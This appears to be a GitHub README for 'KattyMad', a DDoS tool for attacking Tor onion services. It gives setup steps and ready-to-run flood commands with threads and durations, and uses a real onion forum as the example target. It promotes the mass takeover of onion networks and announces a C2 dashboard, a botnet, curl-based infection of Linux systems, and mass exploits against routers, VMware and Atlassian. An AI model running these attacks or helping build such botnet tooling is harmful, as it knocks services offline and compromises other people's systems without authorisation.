# Kattymad
# v1.1
KattyMad is a tool designed to install and perform DDoS attacks over the onion protocol.  <br>
I started from a fork of "KARMA" but it was literally unmaintaned and was using old cookies concept and also network stack was performing worstly than expected.
So i started again and this time i found very useful the MHDDoS project. <br>
Im constantly editing this project because the aim is to create mass environments that can easily takeover onion networks.
Please, read the [TODO](TODO.txt) and help me.

(NB. Credits binary code is just a reverse from ascii common text)<br>
![kattymad](https://github.com/electr0lulz/kattymad/blob/e5438634e844787037fc47dc16806fb2bb05bc06/ddos/files/katty_1.png)


## Usage on Linux ##
Requirements:
You must use Python 3.9 or higher

Step:
```
git clone https://github.com/electr0lulz/kattymad
cd kattymad
sudo ./setup.sh
```
## Example
```
Use DDoS Panel   : python3 kitty.py
Use command line : python3 kitty.py <method> <target> <thread> <time>
```

## Pratical Usage on onion services ##
ATM: best methods are stomp+cookies+slow (and connections) i will include here a script call ddos.sh that require only URL+TIMING args.
```
syntax:
python3 katty.py cookie $1 0 256 proxy.txt $PORT $2
example:
python3 katty.py stomp http://cryptbbtg65gibadeeo2awe3j7s6evg7eklserehqr4w4e2bis5tebid.onion/ 0 64 proxy.txt 256 1800 debug
or
./ddos http://cryptbbtg65gibadeeo2awe3j7s6evg7eklserehqr4w4e2bis5tebid.onion/ 60 ##### it means 60 seconds ddos on url of cryptbbtg65gibadeeo2awe3j7s6evg7eklserehqr4w4e2bis5tebid.onion.
```
Where $PORT is a variable editable into your ddos.sh file, usually 80 is the best option. $1 is the url, and $2 is the timing.
About now it's automatically setted up on 256 threads. (connections don't require anything else)
CryptBB is just an onion example. Use your favorite onion url.

Soon i will remove all unused methods from previous forked version, also, you will be able to access to the C2C management where you can add all your katty servers and start attacks with all shells together.
aaaaand i'll spawn a very nice WebDashboard (now coded in PHP, but soon will be ported in golang) where you can manage your C2C, your bots without needs to open shell, have a very easy way to spread your commands with just a "DataDispatch" or to infect other linux-based systems with just a curl, and a web-exploitter based on realtek, dlink and other shitty-router platform (including some mass-exploit made by me for vmware and atlassian) allowing you to have a botnet very quickly.
Very soon multitor version and captcha bypass will be added, even if we are found a lot of problems in solving the dread-based-captcha.
##

## Dashboard Preview
![kattymad](https://github.com/electr0lulz/kattymad/blob/8e178da3c7acf113ee7ed9996bf6c3c1a1133274/dashboard_preview/login_katty.png)
![kattymad](https://github.com/electr0lulz/kattymad/blob/8e178da3c7acf113ee7ed9996bf6c3c1a1133274/dashboard_preview/kattymain.jpg)
![kattymad](https://github.com/electr0lulz/kattymad/blob/8e178da3c7acf113ee7ed9996bf6c3c1a1133274/dashboard_preview/users.jpg)
![kattymad](https://github.com/electr0lulz/kattymad/blob/ef440b413c8027b0ae20bf2d8d8627af5a343932/dashboard_preview/web_manager.jpg)
![kattymad](https://github.com/electr0lulz/kattymad/blob/ef440b413c8027b0ae20bf2d8d8627af5a343932/dashboard_preview/terminal_commander.jpg)
![kattymad](https://github.com/electr0lulz/kattymad/blob/ef440b413c8027b0ae20bf2d8d8627af5a343932/dashboard_preview/katty_servers.jpg)
![kattymad](https://github.com/electr0lulz/kattymad/blob/ef440b413c8027b0ae20bf2d8d8627af5a343932/dashboard_preview/autoexploit.png)

## NB.
I wish remember to you all, especially to people who suffered paranoia attacks: this is all opensource code. You can read every fucking-single line and see that there's no encoded parameters. So no honeypot, no rat, no fucking bullshit. See you around. 
[Electr0lulz](https://github.com/electr0lulz/)